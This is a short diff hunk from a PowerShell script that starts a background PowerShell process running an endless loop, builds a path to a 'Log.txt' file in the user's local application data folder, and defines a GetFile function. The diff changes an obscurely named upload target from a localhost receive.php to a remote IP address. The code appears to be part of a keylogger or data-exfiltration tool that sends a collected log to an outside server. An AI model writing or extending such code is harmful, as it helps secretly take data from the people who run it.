@@ -10,7 +10,7 @@ Start-Process powershell -ArgumentList "-Command", {
     while($true)
     {
         $logFilePath = Join-Path ([Environment]::GetFolderPath([Environment+SpecialFolder]::LocalApplicationData)) "Log.txt"
-        $srsdf='http://localhost/receive.php' 
+        $srsdf='http://172.20.101.20/receive.php' 
 
         function GetFile() {
             param (
